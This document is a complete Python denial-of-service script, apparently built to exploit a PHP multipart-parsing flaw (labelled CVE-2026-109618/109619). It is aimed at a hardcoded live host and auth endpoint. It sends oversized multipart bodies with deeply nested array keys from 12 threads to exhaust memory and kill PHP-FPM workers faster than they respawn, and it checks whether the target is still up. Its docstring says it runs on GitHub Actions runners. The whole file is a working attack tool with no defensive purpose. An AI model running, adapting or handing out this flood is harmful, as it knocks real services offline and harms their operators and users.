#!/usr/bin/env python3
"""PHP2Shell OOM kill flood (CVE-2026-109618/109619) — runs on GitHub Actions
runners. Kills PHP-FPM workers faster than they respawn -> target stays down."""
import socket, ssl, threading, time, sys, urllib.request

HOST="vibecheck.vibecods.xyz"; PORT=443; PATH="/app/auth.php"
NESTED_KEYS=62
SIZE=8<<20; PARTS=1020

name=b"a[]"+(b"[a]"*NESTED_KEYS)
part=b"--\nContent-Disposition:name="+name+b";filename=\n\n"
base=part*PARTS
filler=(SIZE-len(base))//3
BODY=(b"--\n"+(b"x:\n"*filler)+base[3:])[:-1]
REQ=(f"POST {PATH} HTTP/1.1\r\nHost: {HOST}\r\n"
     f"Content-Type: multipart/form-data; boundary=\r\n"
     f"Content-Length: {len(BODY)}\r\nConnection: close\r\n\r\n").encode()

stop=threading.Event()
stats={"kills":0,"sent":0}

def killer():
    while not stop.is_set():
        try:
            s=socket.create_connection((HOST,PORT),timeout=60)
            s=ssl.create_default_context().wrap_socket(s,server_hostname=HOST)
            s.setsockopt(socket.IPPROTO_TCP,socket.TCP_NODELAY,1)
            try:
                s.sendall(REQ+BODY)
                s.settimeout(30)
                try: resp=s.recv(4096)
                except Exception: resp=b""
                if b"502" in resp[:32] or not resp: stats["kills"]+=1
            except (BrokenPipeError, ssl.SSLError, OSError):
                stats["kills"]+=1
            try: s.close()
            except Exception: pass
            stats["sent"]+=1
        except Exception:
            time.sleep(0.2)

def health():
    try:
        r=urllib.request.urlopen(f"https://{HOST}{PATH}",data=b"action=me",timeout=15)
        return r.status
    except Exception as e:
        return getattr(e,"code",0) or "ERR"

dur=float(sys.argv[1]) if len(sys.argv)>1 else 280
threads=[threading.Thread(target=killer,daemon=True) for _ in range(12)]
for t in threads: t.start()
t0=time.time()
print(f"[*] flood {dur:.0f}s x 12 threads", flush=True)
while time.time()-t0<dur:
    time.sleep(20)
    print(f"[+] t+{time.time()-t0:.0f}s probes={stats['sent']} kills={stats['kills']} "
          f"health={health()}", flush=True)
stop.set()
print(f"[*] done. probes={stats['sent']} kills={stats['kills']} final-health={health()}", flush=True)
